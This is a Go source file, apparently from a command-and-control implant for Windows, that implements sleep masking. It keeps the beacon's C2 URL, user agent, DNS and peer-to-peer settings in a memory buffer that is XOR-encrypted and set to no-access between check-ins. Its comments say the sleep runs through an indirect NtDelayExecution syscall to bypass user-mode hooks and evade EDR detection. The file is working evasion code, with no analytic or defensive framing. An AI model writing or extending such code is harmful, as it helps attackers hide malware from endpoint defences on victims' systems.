//go:build windows

package main

import (
	"crypto/rand"
	"encoding/binary"
	"sync"
	"time"
	"unsafe"
)

const (
	maskBufferSize = 4096
	maskKeySize    = 32
	pageNoaccess   = 0x01
)

var (
	sleepMaskActive bool
	procSleep       = kernel32.NewProc("Sleep")
)

type sleepMaskState struct {
	mu        sync.Mutex
	buffer    []byte
	bufferPtr uintptr
	key       [maskKeySize]byte
	keyIdx    int
	ready     bool
}

var (
	smState  sleepMaskState
	smInitMu sync.Mutex
)

// InitSleepMask prepares the platform sleep-mask infrastructure: a
// VirtualAlloc'd shadow buffer holding the sensitive config strings, parked
// NOACCESS while awake. Whether masked sleeping actually engages is a separate
// policy decision (sleepMaskPolicyEnabled / activateSleepMask).
func InitSleepMask() bool {
	smInitMu.Lock()
	defer smInitMu.Unlock()
	if smState.ready {
		return true
	}

	ptr, _, _ := procVirtualAlloc.Call(0, maskBufferSize, uintptr(memCommit|memReserve), uintptr(pageReadwrite))
	if ptr == 0 {
		return false
	}

	smState.bufferPtr = ptr
	// Create a byte slice backed by the VirtualAlloc'd memory region
	sh := (*[maskBufferSize]byte)(unsafe.Pointer(ptr))
	smState.buffer = sh[:]

	if _, err := rand.Read(smState.key[:]); err != nil {
		return false
	}
	smState.keyIdx = 0

	smState.storeSensitiveData()
	smState.ready = true

	procVirtualProtect.Call(ptr, maskBufferSize, pageNoaccess)
	return true
}

// sleepMaskPolicyEnabled reports whether the adaptive EDR strategy opted in
// to masked sleeping (enableSleepMask is set by ApplyStrategy).
func sleepMaskPolicyEnabled() bool {
	return enableSleepMask
}

func (sm *sleepMaskState) storeSensitiveData() {
	offset := 0
	sm.writeString(&offset, C2URL)
	sm.writeString(&offset, UserAgent)
	sm.writeString(&offset, BeaconURI)
	sm.writeString(&offset, ProxyStr)
	sm.writeString(&offset, P2PMode)
	sm.writeString(&offset, P2PParent)
	sm.writeString(&offset, P2PListenAddr)
	sm.writeString(&offset, DNSDomain)
	sm.writeString(&offset, DNSServer)
	for i := offset; i < len(sm.buffer); i++ {
		sm.buffer[i] = 0
	}
}

func (sm *sleepMaskState) writeString(offset *int, s string) {
	if *offset+2+len(s) > len(sm.buffer) {
		return
	}
	binary.LittleEndian.PutUint16(sm.buffer[*offset:], uint16(len(s)))
	*offset += 2
	copy(sm.buffer[*offset:], s)
	*offset += len(s)
}

func sleepMaskEncrypt() {
	smInitMu.Lock()
	if !smState.ready {
		smInitMu.Unlock()
		return
	}
	smInitMu.Unlock()

	smState.mu.Lock()
	defer smState.mu.Unlock()

	procVirtualProtect.Call(smState.bufferPtr, maskBufferSize, uintptr(pageReadwrite))
	smState.xorCrypt(smState.buffer)
	procVirtualProtect.Call(smState.bufferPtr, maskBufferSize, pageNoaccess)
}

func sleepMaskDecrypt() {
	smInitMu.Lock()
	if !smState.ready {
		smInitMu.Unlock()
		return
	}
	smInitMu.Unlock()

	smState.mu.Lock()
	defer smState.mu.Unlock()

	procVirtualProtect.Call(smState.bufferPtr, maskBufferSize, uintptr(pageReadwrite))
	smState.xorCrypt(smState.buffer)
	procVirtualProtect.Call(smState.bufferPtr, maskBufferSize, pageNoaccess)
}

func (sm *sleepMaskState) xorCrypt(buf []byte) {
	for i := range buf {
		buf[i] ^= sm.key[sm.keyIdx]
		sm.keyIdx = (sm.keyIdx + 1) % maskKeySize
	}
}

// sleepWithMask encrypts the config buffer, sleeps through the active mask
// (indirect NtDelayExecution on Windows), then restores the buffer. The active
// mask is always non-nil after package init.
func sleepWithMask(d time.Duration) {
	sleepWithMaskInterruptible(d)
}

func init() {
	// Route sleep through an indirect NtDelayExecution syscall so user-mode
	// hooks on kernel32!Sleep cannot detect/break sleep masking.
	sleepObfFunc = func(ms uintptr) {
		indirectNtDelayExecution(time.Duration(ms) * time.Millisecond)
	}
}

var (
	sleepDelayOnce sync.Once
	sleepDelayMgr  *syscallManager
)

// indirectNtDelayExecution delays via an indirect NtDelayExecution syscall.
// This bypasses user-mode hooks on Sleep() and prevents EDR from detecting
// sleep masking via kernel32!Sleep hooking.
func indirectNtDelayExecution(d time.Duration) {
	sleepDelayOnce.Do(func() {
		sleepDelayMgr = newSyscallManager()
	})
	mgr := sleepDelayMgr
	if mgr == nil {
		// Fallback: use kernel32 Sleep if the syscall manager is unavailable
		procSleep.Call(uintptr(d.Milliseconds()))
		return
	}
	// NtDelayExecution interval is in 100-ns units, NEGATIVE = relative
	ms := d.Milliseconds()
	if ms < 1 {
		ms = 1
	}
	interval := ms * -10000 // negative = relative
	_, _ = syscallNtDelayExecution(mgr, false, &interval)
}
